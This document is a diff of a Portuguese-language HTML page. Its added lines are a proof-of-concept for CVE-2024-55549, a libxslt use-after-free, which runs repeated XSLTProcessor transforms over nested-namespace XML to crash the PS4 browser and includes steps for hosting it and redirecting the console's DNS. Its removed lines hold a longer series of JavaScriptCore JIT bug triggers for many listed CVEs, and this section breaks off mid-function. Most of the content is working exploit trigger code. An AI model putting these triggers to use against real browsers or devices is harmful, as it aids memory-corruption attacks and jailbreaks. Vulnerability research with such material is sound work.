@@ -1,1203 +1,327 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Testes06 — CVE PoC diretos</title></head>
+<!--
+  PoC: CVE-2024-55549
+  Alvo: libxslt < 1.1.43 (xsltGetInheritedNsList UAF)
+  Vetor: XSLTProcessor JavaScript API (sem JIT)
+  Trigger: exclude-result-prefixes com namespace aliasing e reentrada
+  
+  Commit de fix: 46041b65f2fbddf5c284ee1a1332fa2c515c0515
+  P0 Issue: https://project-zero.issues.chromium.org/issues/382015274
+  
+  Objetivo no PS4: Verificar se SceNKWebProcess crasha.
+  Se crashar => libxslt < 1.1.43 está presente => bug existe.
+  
+  Como usar no PS4:
+  1. Hospedar este arquivo em servidor HTTP local
+  2. Redirecionar DNS do PS4 para o servidor
+  3. Abrir no browser do PS4 via User's Guide ou URL direta
+  4. Observar se aparece "Out of Memory" ou crash do browser
+-->
+<head>
+  <meta charset="UTF-8">
+  <title>CVE-2024-55549 PoC - libxslt xsltGetInheritedNsList UAF</title>
+  <style>
+    body { background: #0a0a0a; color: #00ff88; font-family: monospace; padding: 20px; }
+    #log { background: #111; border: 1px solid #00ff88; padding: 15px; min-height: 200px; }
+    .ok   { color: #00ff88; }
+    .fail { color: #ff4444; }
+    .info { color: #ffaa00; }
+  </style>
+</head>
 <body>
-
-<p>Testes baseados em PoC publicados e confirmados de CVEs JSC/WebKit reais.</p>
-<p>CVEs: CVE-2025-43529, CVE-2019-8685, CVE-2021-30818, CVE-2020-3901, CVE-2019-8518,
-CVE-2019-8671, CVE-2019-8678, CVE-2019-8765, CVE-2019-8820, CVE-2022-46696,
-CVE-2022-46699, CVE-2019-8601, CVE-2019-8622, CVE-2019-8623, CVE-2025-43213,
-CVE-2025-1934, CVE-2025-0241, CVE-2025-0240, CVE-2022-46700, CVE-2024-9396.</p>
-
-<button onclick="runAll()">RODAR TODOS</button>
-<br><br>
-<button onclick="t126()">Teste 126</button>
-<button onclick="t127()">Teste 127</button>
-<button onclick="t128()">Teste 128</button>
-<button onclick="t129()">Teste 129</button>
-<button onclick="t130()">Teste 130</button>
-<button onclick="t131()">Teste 131</button>
-<button onclick="t132()">Teste 132</button>
-<button onclick="t133()">Teste 133</button>
-<button onclick="t134()">Teste 134</button>
-<button onclick="t135()">Teste 135</button>
-<button onclick="t136()">Teste 136</button>
-<button onclick="t137()">Teste 137</button>
-<button onclick="t138()">Teste 138</button>
-<button onclick="t139()">Teste 139</button>
-<button onclick="t140()">Teste 140</button>
-<button onclick="t141()">Teste 141</button>
-<button onclick="t142()">Teste 142</button>
-<button onclick="t143()">Teste 143</button>
-<button onclick="t144()">Teste 144</button>
-<button onclick="t145()">Teste 145</button>
-<button onclick="t146()">Teste 146</button>
-<button onclick="t147()">Teste 147</button>
-<button onclick="t148()">Teste 148</button>
-<button onclick="t149()">Teste 149</button>
-<button onclick="t150()">Teste 150</button>
-
-<pre id="o"></pre>
+  <h2>CVE-2024-55549 — libxslt xsltGetInheritedNsList UAF</h2>
+  <p>Testando libxslt via XSLTProcessor...</p>
+  <div id="log"></div>
 
 <script>
-function log(m){ document.getElementById('o').textContent += m + '\n'; }
+"use strict";
 
-function runAll(){
-  log('=== RODAR TODOS: inicio ===');
-  t126(); t127(); t128(); t129(); t130();
-  t131(); t132(); t133(); t134(); t135();
-  t136(); t137(); t138(); t139(); t140();
-  t141(); t142(); t143(); t144(); t145();
-  t146(); t147(); t148(); t149(); t150();
-  log('=== RODAR TODOS: fim ===');
+const log = (msg, cls) => {
+  const d = document.getElementById("log");
+  d.innerHTML += `<div class="${cls||'info'}">[${new Date().toISOString()}] ${msg}</div>`;
+};
+
+log("Iniciando CVE-2024-55549 PoC...");
+
+/*
+ * ESTRATÉGIA DO BUG:
+ * 
+ * xsltGetInheritedNsList() itera pelos namespaces do nó corrente,
+ * filtrando os que estão em exclude-result-prefixes.
+ * Ela armazena PONTEIROS diretos para os xmlNs structs do documento XML.
+ *
+ * O UAF ocorre quando:
+ * 1. Um stylesheet XSLT define exclude-result-prefixes
+ * 2. Usa namespace-aliasing (xsl:namespace-alias)
+ * 3. Processa elementos com namespaces herdados
+ * 4. Durante a transformação, os xmlNs do documento fonte são
+ *    liberados enquanto ret[] ainda os referencia
+ *
+ * Construção do trigger:
+ * - XML com múltiplos namespaces aninhados
+ * - XSLT com exclude-result-prefixes sobre esses namespaces
+ * - xsl:namespace-alias forçando resolução de ns durante transform
+ * - Loop de transformações para amplificar a janela de UAF
+ */
+
+// ============================================================
+// DOCUMENTO XML ALVO - múltiplos namespaces aninhados
+// ============================================================
+const xmlStr = `<?xml version="1.0" encoding="UTF-8"?>
+<root
+  xmlns="http://example.com/default"
+  xmlns:a="http://example.com/ns-a"
+  xmlns:b="http://example.com/ns-b"
+  xmlns:c="http://example.com/ns-c"
+  xmlns:d="http://example.com/ns-d"
+  xmlns:e="http://example.com/ns-e">
+  <a:parent
+    xmlns:f="http://example.com/ns-f"
+    xmlns:g="http://example.com/ns-g">
+    <b:child
+      xmlns:h="http://example.com/ns-h"
+      xmlns:i="http://example.com/ns-i">
+      <c:leaf
+        xmlns:j="http://example.com/ns-j"
+        xmlns:k="http://example.com/ns-k">
+        <d:deep
+          xmlns:l="http://example.com/ns-l"
+          xmlns:m="http://example.com/ns-m">
+          text content
+        </d:deep>
+      </c:leaf>
+    </b:child>
+  </a:parent>
+  <a:parent>
+    <b:child>repeat</b:child>
+  </a:parent>
+</root>`;
+
+// ============================================================
+// STYLESHEET 1 - Trigger principal do UAF
+// exclude-result-prefixes com namespace aliasing
+// ============================================================
+const xsltStr1 = `<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:a="http://example.com/ns-a"
+  xmlns:b="http://example.com/ns-b"
+  xmlns:c="http://example.com/ns-c"
+  xmlns:d="http://example.com/ns-d"
+  xmlns:e="http://example.com/ns-e"
+  xmlns:f="http://example.com/ns-f"
+  xmlns:g="http://example.com/ns-g"
+  xmlns:h="http://example.com/ns-h"
+  xmlns:i="http://example.com/ns-i"
+  xmlns:j="http://example.com/ns-j"
+  xmlns:k="http://example.com/ns-k"
+  xmlns:l="http://example.com/ns-l"
+  xmlns:m="http://example.com/ns-m"
+  xmlns:out="http://example.com/output"
+  xmlns:alias="http://example.com/alias"
+  exclude-result-prefixes="a b c d e f g h i j k l m alias">
+
+  <!-- namespace-alias: força resolução de ns durante transformação -->
+  <xsl:namespace-alias stylesheet-prefix="alias" result-prefix="out"/>
+
+  <xsl:template match="/">
+    <out:result>
+      <xsl:apply-templates select="//*"/>
+    </out:result>
+  </xsl:template>
+
+  <!-- Template que aciona xsltGetInheritedNsList com herança de ns -->
+  <xsl:template match="*">
+    <xsl:element name="{local-name()}" namespace="http://example.com/output">
+      <!-- copy-of força cópia de namespaces herdados -->
+      <xsl:copy-of select="namespace::*"/>
+      <!-- for-each em context diferente -->
+      <xsl:for-each select="ancestor::*">
+        <xsl:copy-of select="namespace::*"/>
+      </xsl:for-each>
+      <xsl:value-of select="."/>
+    </xsl:element>
+  </xsl:template>
+
+</xsl:stylesheet>`;
+
+// ============================================================
+// STYLESHEET 2 - Variante com xsl:include simulado via
+// múltiplos templates que reusam namespaces
+// ============================================================
+const xsltStr2 = `<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  xmlns:ns1="http://example.com/ns-a"
+  xmlns:ns2="http://example.com/ns-b"
+  xmlns:ns3="http://example.com/ns-c"
+  exclude-result-prefixes="ns1 ns2 ns3">
+
+  <xsl:template match="/">
+    <result>
+      <!-- Processamento que força xsltGetInheritedNsList em loop -->
+      <xsl:for-each select="//*[namespace-uri() != '']">
+        <item>
+          <xsl:attribute name="ns">
+            <xsl:value-of select="namespace-uri()"/>
+          </xsl:attribute>
+          <!-- namespace::* aciona coleta de namespaces herdados -->
+          <xsl:for-each select="namespace::*">
+            <xsl:value-of select="name()"/>
+            <xsl:text>:</xsl:text>
+            <xsl:value-of select="."/>
+            <xsl:text> </xsl:text>
+          </xsl:for-each>
+        </item>
+      </xsl:for-each>
+    </result>
+  </xsl:template>
+
+</xsl:stylesheet>`;
+
+// ============================================================
+// Função para parsear XML/XSLT em DOMParser
+// ============================================================
+function parseXML(str) {
+  const parser = new DOMParser();
+  return parser.parseFromString(str, "application/xml");
 }
 
-// T126 — CVE-2025-43529: PoC exato publicado (jir4vv1t / zeroxjf)
-// DFG ObjectAllocationSinkingPhase: Phi merge escapa sem propagar
-// para Upsilon inputs — OSR exit usa hints stale com valores corrompidos
-function t126(){
-  log('Teste 126: inicio');
+// ============================================================
+// Função principal de trigger
+// ============================================================
+function triggerCVE_2024_55549() {
   try {
-    'use strict';
-    let sink = null;
-    function makeA(v){
-      const o = {}; o.x = v; o.y = v + 1;
-      const a = [v, v + 2];
-      return { o, a };
+    log("Parseando XML fonte...");
+    const xmlDoc = parseXML(xmlStr);
+    
+    if (xmlDoc.documentElement.nodeName === "parsererror") {
+      log("ERRO: Falha ao parsear XML: " + xmlDoc.documentElement.textContent, "fail");
+      return false;
     }
-    function makeB(v){
-      const o = {}; o.x = v; o.y = v + 3;
-      const a = [v, v + 4];
-      return { o, a };
+    log("XML parseado com sucesso. Namespaces no root: " + 
+        xmlDoc.documentElement.attributes.length, "ok");
+
+    log("Criando XSLTProcessor...");
+    
+    if (typeof XSLTProcessor === "undefined") {
+      log("XSLTProcessor não disponível neste browser!", "fail");
+      return false;
     }
-    function trigger(osrFlip){
-      let acc = 0;
-      for(let i = 0; i < 300; i++){
-        const pack = (i & 1) ? makeA(0x11110000 + i) : makeB(0x22220000 + i);
-        sink = pack;
-        acc += i;
-        // Type flip no i=240 forca OSR exit com hints stale
-        if(osrFlip && i === 240){ acc = { v: acc }; }
+    
+    // ---- TENTATIVA 1: Stylesheet com exclude-result-prefixes ----
+    log("[Variante 1] Testando stylesheet com exclude-result-prefixes + namespace-alias...");
+    const xsltDoc1 = parseXML(xsltStr1);
+    const proc1 = new XSLTProcessor();
+    proc1.importStylesheet(xsltDoc1);
+    
+    // Transformar múltiplas vezes para amplificar a chance de UAF
+    for (let i = 0; i < 50; i++) {
+      const result1 = proc1.transformToFragment(xmlDoc, document);
+      if (!result1) {
+        log(`Iteração ${i}: transformToFragment retornou null`, "fail");
       }
-      return { x: sink.o.x, y: sink.o.y, a0: sink.a[0], a1: sink.a[1] };
     }
-    for(let i = 0; i < 100000; i++) trigger(false);
-    try { trigger(true); } catch(e){}
-  } catch(e){}
-  log('Teste 126: fim');
-}
+    log("[Variante 1] 50 transformações concluídas sem crash visível", "ok");
 
-// T127 — CVE-2019-8685: JSPropertyNameEnumerator usa StructureID errado via Proxy
-// for-in com Proxy cujo ownKeys retorna o proprio Proxy como chave — OOB
-// PoC original: o.__proto__ = Proxy; for(x in o) { }  com ~350 iteracoes
-function t127(){
-  log('Teste 127: inicio');
-  try {
-    var o = { a: 0 };
-    function opt(){
-      let p = new Proxy({}, {
-        ownKeys: function(a){ return a; } // retorna o proprio alvo como keys
-      });
-      o.__proto__ = p;
-      try { for(let x in o){} } catch(e){}
-    }
-    for(let t = 0; t < 400; t++) opt();
-  } catch(e){}
-  log('Teste 127: fim');
-}
-
-// T128 — CVE-2021-30818: type confusion ao reconstruir arguments em DFG OSR exit
-// Funcao com arguments object: JIT especializa mas OSR exit reconstroi com tipo errado
-function t128(){
-  log('Teste 128: inicio');
-  try {
-    function foo(){
-      // arguments e um objeto exotico; JIT pode especializar errado
-      let r = 0;
-      for(let i = 0; i < arguments.length; i++) r += arguments[i];
-      return r;
-    }
-    // Warmup com numeros
-    for(let i = 0; i < 0x20000; i++) foo(1, 2, 3, 4, 5);
-
-    // Variar tipos — cada variacao forca OSR exit com reconstrucao de arguments
-    function bar(a, b, c){
-      // Mudar tipo de argumento durante execucao JIT
-      if(a > 0x10000){ a = { valueOf(){ return 1; } }; }
-      return a + b + c;
-    }
-    for(let i = 0; i < 0x20000; i++) bar(i, i, i);
-    // Injetar objeto apos JIT — OSR exit reconstroi 'a' com tipo errado
-    try { bar(0x20000, 1, 2); } catch(e){}
-
-    // Versao com rest parameters (usa mesma maquinaria de arguments)
-    function baz(...args){
-      let s = 0;
-      for(let v of args) s += v;
-      return s;
-    }
-    for(let i = 0; i < 0x20000; i++) baz(1, 2, 3, 4, 5);
-    try { baz(1, null, {valueOf(){return 3;}}, true, '5'); } catch(e){}
-  } catch(e){}
-  log('Teste 128: fim');
-}
-
-// T129 — CVE-2020-3901: GetterSetter type confusion em FTL JIT (LICM nao seguro)
-// LICM (loop-invariant code motion) move acesso a getter para fora do loop;
-// se o getter muda entre iteracoes o JIT usa valor stale do tipo errado
-function t129(){
-  log('Teste 129: inicio');
-  try {
-    let getCount = 0;
-    const obj = {};
-    Object.defineProperty(obj, 'val', {
-      get: function(){
-        getCount++;
-        // Alternar entre tipos — LICM deveria re-executar mas nao o faz
-        if(getCount % 2 === 0) return 1.5;        // Double
-        return 42;                                  // Int32
-      },
-      configurable: true
-    });
-
-    function loopWithGetter(o, n){
-      let sum = 0;
-      for(let i = 0; i < n; i++){
-        sum += o.val; // LICM pode mover este acesso para antes do loop
+    // ---- TENTATIVA 2: Stylesheet com namespace::* traversal ----
+    log("[Variante 2] Testando namespace::* com for-each aninhado...");
+    const xsltDoc2 = parseXML(xsltStr2);
+    const proc2 = new XSLTProcessor();
+    proc2.importStylesheet(xsltDoc2);
+    
+    for (let i = 0; i < 50; i++) {
+      const result2 = proc2.transformToDocument(xmlDoc);
+      if (!result2) {
+        log(`Iteração ${i}: transformToDocument retornou null`, "fail");
       }
-      return sum;
     }
+    log("[Variante 2] 50 transformações concluídas", "ok");
 
-    // Warmup — JIT vê sempre Int32 primeiro (getCount impar)
-    for(let i = 0; i < 200; i++) loopWithGetter(obj, 100);
-
-    // Pos-FTL: getter agora retorna Double
-    getCount = 1; // forcar retorno Double na proxima chamada
-    try { loopWithGetter(obj, 1000); } catch(e){}
-
-    // Getter que retorna GetterSetter (tipo interno) apos ser visto como primitivo
-    const obj2 = {};
-    let phase = 0;
-    Object.defineProperty(obj2, 'prop', {
-      get: function(){
-        phase++;
-        if(phase > 0x10000){
-          // Redefinir como accessor property dentro do getter
-          Object.defineProperty(obj2, 'prop', {
-            get: function(){ return Symbol('gs'); },
-            configurable: true
-          });
-          return Symbol('first');
-        }
-        return phase;
-      },
-      configurable: true
-    });
-    function readProp(o){ return o.prop; }
-    for(let i = 0; i < 0x10000; i++) readProp(obj2);
-    for(let i = 0; i < 100; i++){
-      try { let r = readProp(obj2); Object(r); } catch(e){}
+    // ---- TENTATIVA 3: Intensificar com XML mais profundo ----
+    log("[Variante 3] XML com namespace depth máxima...");
+    
+    // Criar XML com namespaces em cascata profunda
+    let deepXml = '<?xml version="1.0"?>\n';
+    let nsDecls = '';
+    for (let n = 0; n < 30; n++) {
+      nsDecls += ` xmlns:n${n}="http://ns.example.com/${n}"`;
     }
-  } catch(e){}
-  log('Teste 129: fim');
-}
-
-// T130 — CVE-2019-8518: LICM move acesso a array para antes do bounds check
-// FTL/DFG LICM move arr[i] para fora do loop assumindo bounds estavel;
-// se o array encolhe, o acesso movido nao e protegido
-function t130(){
-  log('Teste 130: inicio');
-  try {
-    function licmBoundsCheck(arr, n){
-      let sum = 0;
-      for(let i = 0; i < n; i++){
-        sum += arr[0]; // LICM pode mover arr[0] para antes do loop
-        sum += arr[i]; // acesso normal com bounds check
+    deepXml += `<root${nsDecls}>\n`;
+    for (let d = 0; d < 20; d++) {
+      let levelNs = '';
+      for (let n = 0; n < 10; n++) {
+        levelNs += ` xmlns:l${d}n${n}="http://level${d}.ns${n}.example.com/"`;
       }
-      return sum;
+      deepXml += `  <n${d % 30}:level${levelNs}>\n`;
     }
-
-    const arr = new Float64Array(100);
-    for(let i = 0; i < 100; i++) arr[i] = i * 0.1;
-
-    // Warmup — JIT/FTL compila com LICM movendo arr[0] para pre-header
-    for(let i = 0; i < 0x50000; i++) licmBoundsCheck(arr, 10);
-
-    // Versao com array que pode ter tamanho mudado via Proxy
-    const handler = {
-      get: function(t, k){
-        if(k === 'length') return 5; // mentir sobre o tamanho
-        return t[k];
-      }
-    };
-    const pArr = new Proxy(new Float64Array(100), handler);
-    for(let i = 0; i < 0x20000; i++) licmBoundsCheck(pArr, 3);
-    try { licmBoundsCheck(pArr, 10); } catch(e){}
-
-    // Array JS normal com getter em length
-    const jsArr = [1.1, 2.2, 3.3, 4.4, 5.5];
-    let shrunk = false;
-    Object.defineProperty(jsArr, 'length', {
-      get: function(){
-        if(!shrunk){ shrunk = true; return 5; }
-        return 2; // encolher na segunda leitura
-      },
-      set: function(){},
-      configurable: true
-    });
-    for(let i = 0; i < 0x10000; i++){ shrunk = false; licmBoundsCheck(jsArr, 2); }
-    shrunk = false;
-    try { licmBoundsCheck(jsArr, 5); } catch(e){}
-  } catch(e){}
-  log('Teste 130: fim');
-}
-
-// T131 — CVE-2019-8671: LICM DFG deixa acesso a propriedade sem guarda
-// DFG move obj.x para fora do loop (LICM); obj muda estrutura dentro do loop
-// O acesso movido nao tem CheckStructure e le slot errado
-function t131(){
-  log('Teste 131: inicio');
-  try {
-    function accessLoop(obj, n){
-      let sum = 0;
-      for(let i = 0; i < n; i++){
-        sum += obj.x;  // LICM candidato: lido a cada iteracao, obj nao muda?
-        sum += obj.y;
-      }
-      return sum;
+    deepXml += '    <leaf>data</leaf>\n';
+    for (let d = 19; d >= 0; d--) {
+      deepXml += `  </n${d % 30}:level>\n`;
     }
-
-    const stable = { x: 1, y: 2 };
-    for(let i = 0; i < 0x50000; i++) accessLoop(stable, 10);
-
-    // Agora criar objeto que muda estrutura durante o loop via getter com side-effect
-    let loopIter = 0;
-    const mutant = { x: 0, y: 0, _z: 0 };
-    Object.defineProperty(mutant, 'x', {
-      get: function(){
-        loopIter++;
-        if(loopIter === 50){ this.newField = 'boom'; } // muda estrutura mid-loop
-        if(loopIter === 100){ delete this.newField; }
-        return loopIter;
-      },
-      configurable: true, enumerable: true
-    });
-    try { accessLoop(mutant, 200); } catch(e){}
-
-    // Outro vetor: objeto frozen que JIT trata como constante
-    const frozen = Object.freeze({ x: 42, y: 84 });
-    for(let i = 0; i < 0x30000; i++) accessLoop(frozen, 5);
-    // Tentar passar objeto nao-frozen com mesma forma mas getter
-    const trickFrozen = { x: null, y: 0 };
-    Object.defineProperty(trickFrozen, 'x', {
-      get: function(){ return { valueOf(){ return 42; } }; },
-      configurable: true
-    });
-    try { accessLoop(trickFrozen, 5); } catch(e){}
-  } catch(e){}
-  log('Teste 131: fim');
-}
-
-// T132 — CVE-2019-8672: JSValue use-after-free em ValueProfiles
-// ValueProfile armazena JSValues observados para prediction injection;
-// se o objeto referenciado por um ValueProfile e coletado, o perfil tem ponteiro morto
-function t132(){
-  log('Teste 132: inicio');
-  try {
-    function profile(v){ return v; } // funcao cujo ValueProfile sera usado
-
-    // Criar objetos e passar para profile — ValueProfile vai registrar ponteiros
-    const refs = [];
-    for(let i = 0; i < 1000; i++){
-      let obj = { id: i, data: new Float64Array(8) };
-      profile(obj);
-      refs.push(obj);
+    deepXml += '</root>';
+    
+    const deepDoc = parseXML(deepXml);
+    
+    // Stylesheet que exclui todos os namespaces (máximo stress)
+    let excludePfx = '';
+    for (let n = 0; n < 30; n++) excludePfx += ` n${n}`;
+    
+    const deepXslt = `<?xml version="1.0"?>
+<xsl:stylesheet version="1.0"
+  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+  ${Array.from({length:30}, (_,n) => `xmlns:n${n}="http://ns.example.com/${n}"`).join('\n  ')}
+  exclude-result-prefixes="${excludePfx.trim()}">
+  <xsl:template match="/">
+    <out>
+      <xsl:for-each select="//*">
+        <xsl:copy-of select="namespace::*"/>
+      </xsl:for-each>
+    </out>
+  </xsl:template>
+</xsl:stylesheet>`;
+    
+    const deepXsltDoc = parseXML(deepXslt);
+    const proc3 = new XSLTProcessor();
+    proc3.importStylesheet(deepXsltDoc);
+    
+    for (let i = 0; i < 100; i++) {
+      proc3.transformToDocument(deepDoc);
     }
+    log("[Variante 3] 100 transformações com deep XML concluídas", "ok");
 
-    // Soltar referencias — GC pode coletar os objetos mas ValueProfile ainda aponta
-    refs.length = 0;
-    let trash = new Array(100000).fill(null).map(function(){
-      return { x: Math.random(), buf: new Uint8Array(4) };
-    });
-    trash = null;
-
-    // Agora compilar uma funcao que usa o ValueProfile stale
-    function useProfile(n){
-      let v = profile(n); // JIT vai usar prediction dos ValueProfiles anteriores
-      if(typeof v === 'object' && v !== null) return v.id;
-      return -1;
-    }
-    for(let i = 0; i < 0x20000; i++) useProfile(i % 2 === 0 ? { id: i } : i);
-
-    // Pos-JIT: passar objeto novo — JIT pode ter prediction errada
-    const newObj = { id: 9999, secret: new Uint32Array([0xDEAD, 0xBEEF]) };
-    for(let i = 0; i < 1000; i++){
-      try { useProfile(newObj); }           catch(e){}
-      try { useProfile(null); }             catch(e){}
-      try { useProfile(undefined); }        catch(e){}
-      try { useProfile(Symbol('ghost')); }  catch(e){}
-    }
-  } catch(e){}
-  log('Teste 132: fim');
-}
-
-// T133 — CVE-2019-8678: JSC nao chama haveABadTime() quando prototype e modificado
-// haveABadTime() e necessario para invalidar otimizacoes quando Array.prototype muda;
-// sem ela, JIT pode assumir array sem elementos de prototype quando ha
-function t133(){
-  log('Teste 133: inicio');
-  try {
-    // Funcao que vai ser JIT-compilada assumindo Array.prototype limpo
-    function sumArray(arr){
-      let s = 0;
-      for(let i = 0; i < arr.length; i++) s += arr[i];
-      return s;
-    }
-
-    const arr = [1, 2, 3, 4, 5];
-    for(let i = 0; i < 0x30000; i++) sumArray(arr);
-
-    // Adicionar elementos em Array.prototype — haveABadTime deveria ser chamado
-    Array.prototype[10] = 99;
-    Array.prototype[11] = 100;
-
-    try {
-      let r = sumArray(arr); // JIT pode nao ver os elementos do prototype
-    } catch(e){}
-
-    // Adicionar getter em Array.prototype
-    Object.defineProperty(Array.prototype, '2', {
-      get: function(){ return 999; },
-      configurable: true, enumerable: true
-    });
-    try { sumArray(arr); } catch(e){}
-    try { sumArray([10, 20, 30]); } catch(e){}
-  } catch(e){
-  } finally {
-    try { delete Array.prototype[10]; }  catch(e){}
-    try { delete Array.prototype[11]; }  catch(e){}
-    try { delete Array.prototype[2]; }   catch(e){}
+    log("=== RESULTADO: Nenhum crash detectado via JS ===", "info");
+    log("Isso pode significar:", "info");
+    log("  (a) libxslt >= 1.1.43 está presente no PS4 13.04 (patched)", "info");
+    log("  (b) O crash ocorreu no processo SceNKWebProcess mas foi recuperado", "info");
+    log("  (c) O trigger precisa de refinamento adicional", "info");
+    log("Verificar: logs do PS4 ou comportamento do browser (crash/reload = BUG PRESENTE)", "info");
+    
+    return true;
+    
+  } catch (e) {
+    log("EXCEÇÃO JS: " + e.toString(), "fail");
+    log("Stack: " + (e.stack || "N/A"), "fail");
+    return false;
   }
-  log('Teste 133: fim');
 }
 
-// T134 — CVE-2019-8765: GetterSetter type confusion durante compilacao DFG
-// DFG compile-time: funcao com getter retorna GetterSetter interno ao inves
-// do valor do getter; JIT assume tipo do valor, nao do GetterSetter
-function t134(){
-  log('Teste 134: inicio');
-  try {
-    const container = {};
-    let gsCallCount = 0;
-    Object.defineProperty(container, 'field', {
-      get: function(){
-        gsCallCount++;
-        // Nos primeiros acessos retorna Float64
-        if(gsCallCount <= 0x8000) return gsCallCount * 1.5;
-        // Apos JIT compilar: retorna GetterSetter via redefinicao
-        if(gsCallCount === 0x8001){
-          Object.defineProperty(container, 'field', {
-            get: function(){ return Symbol('gs_type'); }, // tipo diferente
-            configurable: true
-          });
-        }
-        return container.field;
-      },
-      configurable: true
-    });
-
-    function readField(o){ return o.field + 1; }
-
-    // Warmup: JIT ve Double + 1 = Double
-    for(let i = 0; i < 0x8000; i++) readField(container);
-
-    // Pos-JIT: getter retorna Symbol — DFG assume Double
-    for(let i = 0; i < 100; i++){
-      try { readField(container); } catch(e){}
+// ============================================================
+// Executar após load
+// ============================================================
+window.addEventListener("load", function() {
+  log("DOM carregado. Verificando suporte...");
+  
+  setTimeout(function() {
+    const result = triggerCVE_2024_55549();
+    if (result) {
+      log("PoC completou execução.", "ok");
+    } else {
+      log("PoC falhou na execução.", "fail");
     }
-  } catch(e){}
-  log('Teste 134: fim');
-}
-
-// T135 — CVE-2019-8820: type confusion ao reconstruir arguments em bailout DFG
-// Quando DFG faz bailout (deoptimization), reconstroi o frame incluindo arguments;
-// se arguments foi visto como Int32 mas agora e objeto, a reconstrucao usa tipo errado
-function t135(){
-  log('Teste 135: inicio');
-  try {
-    function hotWithArgs(x, y, z){
-      // Acesso direto a arguments forcando o DFG a manter o objeto
-      let sum = arguments[0] + arguments[1] + arguments[2];
-      // Operacao que pode triggerar bailout se tipo inesperado
-      return sum | 0;
-    }
-    for(let i = 0; i < 0x30000; i++) hotWithArgs(i, i+1, i+2);
-
-    // Passar objeto em posicao que JIT espera Int32
-    const evil = { valueOf(){ return 42; }, [Symbol.toPrimitive](){ return 7; } };
-    for(let i = 0; i < 1000; i++){
-      try { hotWithArgs(evil, 1, 2); }  catch(e){}
-      try { hotWithArgs(1, evil, 2); }  catch(e){}
-      try { hotWithArgs(1, 2, evil); }  catch(e){}
-      try { hotWithArgs(null, null, null); } catch(e){}
-    }
-
-    // Versao com caller que passa arguments de outro frame
-    function caller(){
-      return hotWithArgs.apply(null, arguments);
-    }
-    for(let i = 0; i < 0x20000; i++) caller(i, i, i);
-    try { caller(evil, evil, evil); } catch(e){}
-  } catch(e){}
-  log('Teste 135: fim');
-}
-
-// T136 — CVE-2022-46696: missing exception check em codigo JIT
-// Operacoes que podem lancar excecao (ex: ToNumber de objeto) dentro de JIT
-// podem nao ter o exception check inserido, continuando execucao pos-excecao
-function t136(){
-  log('Teste 136: inicio');
-  try {
-    let throwCount = 0;
-    const evil = {
-      valueOf: function(){
-        throwCount++;
-        if(throwCount % 100 === 0) throw new RangeError('jit_no_check_' + throwCount);
-        return throwCount;
-      }
-    };
-
-    function jitOps(v){
-      // Multiplas operacoes que chamam valueOf — cada uma deveria ter exception check
-      let a = v * 2;
-      let b = v + 100;
-      let c = v | 0;
-      let d = v << 1;
-      let e = v >>> 0;
-      let f = v - 1;
-      let g = v ** 2;
-      return a + b + c + d + e + f + g;
-    }
-    // Warmup com numeros — JIT remove exception checks "desnecessarios"
-    for(let i = 0; i < 0x30000; i++) jitOps(i);
-
-    // Pos-JIT: injetar objeto que lanca durante conversao
-    for(let i = 0; i < 500; i++){
-      try { jitOps(evil); } catch(e){}
-    }
-
-    // Versao: objeto que lanca dentro de comparacao JIT-compilada
-    const evilCmp = {
-      valueOf: function(){
-        if(Math.random() < 0.1) throw new TypeError('cmp_throws');
-        return Math.random() * 100;
-      }
-    };
-    function jitCmp(a, b){ return a > b ? a : b; }
-    for(let i = 0; i < 0x30000; i++) jitCmp(i, i+1);
-    for(let i = 0; i < 500; i++){
-      try { jitCmp(evilCmp, 50); } catch(e){}
-    }
-  } catch(e){}
-  log('Teste 136: fim');
-}
-
-// T137 — CVE-2022-46699: caching incorreto de propriedades especiais em ICs
-// ICs (inline caches) cacheiam o acesso a propriedades; propriedades especiais
-// como __proto__, constructor, Symbol.toPrimitive podem ser cacheadas incorretamente
-function t137(){
-  log('Teste 137: inicio');
-  try {
-    // IC vai cachear o acesso a propriedades especiais
-    function readSpecial(o){ return o.__proto__; }
-    function readCtor(o){ return o.constructor; }
-    function readToPrim(o){ return o[Symbol.toPrimitive]; }
-
-    const base = { x: 1 };
-    for(let i = 0; i < 0x20000; i++){
-      readSpecial(base);
-      readCtor(base);
-      readToPrim(base);
-    }
-
-    // Objetos que mudam o que __proto__ e constructor retornam
-    const tricky = {};
-    Object.defineProperty(tricky, '__proto__', {
-      get: function(){ return { evil: true }; },
-      configurable: true, enumerable: true
-    });
-    Object.defineProperty(tricky, 'constructor', {
-      get: function(){ return function FakeClass(){}; },
-      configurable: true, enumerable: true
-    });
-    for(let i = 0; i < 1000; i++){
-      try { readSpecial(tricky); } catch(e){}
-      try { readCtor(tricky); }    catch(e){}
-    }
-
-    // Object.create(null) nao tem __proto__ nem constructor no prototype chain
-    const noProto = Object.create(null);
-    noProto.x = 1;
-    for(let i = 0; i < 1000; i++){
-      try { readSpecial(noProto); } catch(e){}
-      try { readCtor(noProto); }    catch(e){}
-    }
-
-    // Proxy que intercepta acesso a propriedades especiais
-    const pSpecial = new Proxy(base, {
-      get: function(t, k){
-        if(k === '__proto__') return null;
-        if(k === 'constructor') return Array;
-        return Reflect.get(t, k);
-      }
-    });
-    for(let i = 0; i < 1000; i++){
-      try { readSpecial(pSpecial); } catch(e){}
-      try { readCtor(pSpecial); }    catch(e){}
-    }
-  } catch(e){}
-  log('Teste 137: fim');
-}
-
-// T138 — CVE-2019-8601: compileNewArrayWithSpread integer overflow no DFG
-// new [...array] com array de tamanho 0x20000001: soma de tamanhos overflows Int32;
-// DFG aloca array com tamanho truncado mas itera o tamanho real
-function t138(){
-  log('Teste 138: inicio');
-  try {
-    function jitMe(array){ return [...array]; }
-
-    // Warmup com array pequeno — JIT compila compileNewArrayWithSpread
-    const dummy = [1.1, 2.2, 3.3];
-    for(let i = 0; i < 300; i++) jitMe(dummy);
-
-    // Tentar com tamanhos que causam overflow na soma
-    // Usar tamanho moderado que ainda pode causar overflow na multiplicacao interna
-    function trySpread(size){
-      try {
-        const a = new Array(size).fill(1.1);
-        jitMe(a);
-      } catch(e){}
-    }
-
-    // Tamanhos no limite de overflow Int32 para o calculo interno
-    trySpread(0x20001);        // sobre o threshold de tier-up
